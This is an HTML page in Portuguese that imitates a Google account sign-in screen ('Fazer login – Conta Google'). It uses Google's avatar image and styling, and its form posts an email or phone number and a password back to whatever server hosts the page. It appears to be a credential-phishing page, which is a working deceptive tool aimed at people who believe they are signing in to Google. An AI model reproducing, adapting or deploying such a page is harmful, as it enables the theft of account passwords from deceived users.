<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8">
<title>Fazer login – Conta Google</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #f1f1f1;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }
    .login-box {
        background: white;
        padding: 40px;
        border-radius: 8px;
        box-shadow: 0px 2px 6px rgba(0,0,0,0.2);
        width: 320px;
    }
    .login-box img {
        display: block;
        margin: 0 auto 20px;
        width: 80px;
    }
    h2 {
        text-align: center;
        margin-bottom: 20px;
        font-weight: normal;
        font-size: 20px;
    }
    input[type="text"], input[type="password"] {
        width: 100%;
        padding: 10px;
        margin: 8px 0;
        border: 1px solid #ccc;
        border-radius: 4px;
    }
    button {
        width: 100%;
        padding: 10px;
        background-color: #1a73e8;
        color: white;
        border: none;
        border-radius: 4px;
        font-size: 16px;
    }
    button:hover {
        background-color: #0c5fd0;
    }
</style>
</head>
<body>
    <div class="login-box">
        <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google Logo">
        <h2>Fazer login</h2>
        <form method="POST">
            <input type="text" name="email" placeholder="E-mail ou telefone" required>
            <input type="password" name="password" placeholder="Senha" required>
            <button type="submit">Próxima</button>
        </form>
    </div>
</body>
</html>
